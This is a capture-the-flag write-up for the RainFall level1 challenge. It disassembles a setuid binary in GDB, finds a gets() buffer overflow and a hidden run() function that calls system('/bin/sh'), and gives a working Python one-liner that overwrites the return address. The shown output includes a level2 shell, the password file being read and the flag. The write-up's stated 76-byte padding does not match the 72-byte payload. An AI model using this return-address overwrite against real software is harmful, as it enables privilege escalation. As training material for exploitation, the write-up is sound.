# Level1

In this level, I also found a binary file (`level1`):

```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

When running this binary file, it hangs:

```
level1@RainFall:~$ ./level1 EE
^c
level1@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and found that the `main` function uses **`gets()`** to retrieve the input. The program allocates a buffer of size 0x50 (80 bytes):

```
(gdb) disas main
Dump of assembler code for function main:
0x08048480 <+0>:  push   %ebp
0x08048481 <+1>:  mov    %esp,%ebp
0x08048483 <+3>:  and    $0xfffffff0,%esp
0x08048486 <+6>:  sub    $0x50,%esp
0x08048489 <+9>:  lea    0x10(%esp),%eax
0x0804848d <+13>: mov    %eax,(%esp)
0x08048490 <+16>: call   0x8048340 <gets@plt>
0x08048495 <+21>: leave
0x08048496 <+22>: ret
End of assembler dump.
(gdb)
```

The use of **`gets()`** makes the program vulnerable to buffer overflow due to the lack of bounds checking on input.

```
(gdb) info functions
All defined functions:
Non-debugging symbols:
...
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
...
0x0804854c  _fini
```

By examining the available functions, we identified the `run` function:

```
(gdb) disas run
...
0x08048472 <+46>:  movl   $0x8048584,(%esp)
0x08048479 <+53>:  call   0x8048360 <system@plt>
...
0x0804847f <+59>:  ret
```

To determine the command executed by the `system` function:

```
(gdb) x/s 0x8048584
0x8048584: "/bin/sh"
```

## Vulnerability

The use of **`gets()`** makes the program vulnerable to buffer overflow due to the absence of bounds checking on input.

## Exploit

To exploit this vulnerability, we need to:

1. Fill the buffer with 76 bytes (80 bytes minus the 4-byte address size).
2. Overwrite the return address with the address of the `run` function (`0x08048444`).
3. Keep the input stream open to maintain shell access.

The final exploit is:

```bash
(python -c 'print("A" * 72 + "\x44\x84\x04\x08" * 2)'; cat ) | ./level1
```

Result:

```python
level1@RainFall:~$ (python -c 'print("A" * 72 + "\x44\x84\x04\x08" * 2)'; cat ) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Flag

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```